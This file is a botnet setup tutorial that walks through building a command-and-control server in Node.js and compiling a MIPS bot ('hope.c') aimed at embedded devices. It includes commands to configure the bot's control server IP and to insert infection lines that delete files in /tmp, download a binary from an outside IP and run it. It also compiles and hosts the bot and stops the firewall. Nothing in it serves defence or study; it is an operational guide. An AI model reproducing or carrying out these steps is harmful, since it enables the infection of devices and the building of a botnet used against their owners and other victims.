
# ___     __________  ____ _______      _____ _______________.___.  ___     
# / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\ 
# \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/ 
#           |    |   \ |   /    |    \/    |    \    |   \\____   |          
#           |______  / |___\____|__  /\____|__  /____|_  // ______|          
#                  \/              \/         \/       \/ \/                 

					***JAVASCRIPT BOTNET TUTORIAL***
			***RUN "yum update" BEFORE YOU DO ANY OF THIS***

#########################################
#############DEPENDENCIES################
#########################################
* YOU MUST RUN THESE OR IT WILL NOT WORK*
*		RUN THEM IN THIS ORDER          *
*****************************************
	  
yum install screen -y 
yum install httpd -y 
yum install telnet -y 
yum install gcc -y 
yum install nano -y
yum install wget -y
yum install unzip -y
yum install curl -y
curl --silent --location https://rpm.nodesource.com/setup | bash -
yum install nodejs

#########################################
########## SETTING UP THE NET ###########
#########################################

**START BY MAKING 2 DIRECTORYS**
**TO DO THIS RUN THESE COMMANDS**

mkdir compile
mkdir telnet

**NOW UPLOAD THESE FILES INTO TELNET**
>>botnet_cfg.json
>>botnet_server.js
>>node_modules

	**NOW TO CONFIG THE FILES**
*OPEN UP THE botnet_cfg.json file**

FIND THIS LINE:	>>>		"": {
* ENTER YOUR DESIRED USERNAME WITHIN THE "" *

FIND THIS LINE:	>>>			"password": "",
* ENTER YOUR DESIRED PASSWORD WITHIN THE "" *

*DO THE SAME WITH THE OTHER USER*

	*** TIME TO SCREEN THE NET ***
** ENTER THESE COMMANDS IN THIS ORDER **
screen
node botnet_server.js
press [CTRL+A+D]
should say listening on port 443

#########################################
########## CONFIGING THE BOT ############
#########################################

** SETTING UP DIRECTORYS **

cd compile
wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2 && tar -vxjf cross-compiler-mips.tar.bz2
cd cross-compiler-mips ; cd bin
upload hope.c

** CONFIGING THE BOT FILE **
		
open up hope.c

FIND THIS LINE:	>>>

unsigned char *commServer[] =
{
        "1.1.1.1:443"			
};

<<<
*** REPLACE THE IP WITH YOUR SERVER IP ***
*** FIND THESE ON LINE 988 & LINE 995 ***
*** REPLACE THEM WITH YOUR WGET LINE ***

>> "cd /tmp && rm -rf * && wget http://185.62.188.209/ubntp && ./ubntp\r\n"
>> "cd /tmp && rm -rf * && wget http://185.62.188.209/ubntp && ./ubntp\r\n"
** SAVE THE CHANGES AND EXIT **

*** TIME TO COMPILE THE BOT ***

./mips-gcc -o mips hope.c ; rm -rf hope.c ; mv mips /var/www/html

*** FINISHING UP ***
		
** RUN THESE COMMANDS **

service iptables stop
service httpd restart

telnet localhost 443
@login yourusername yourpassword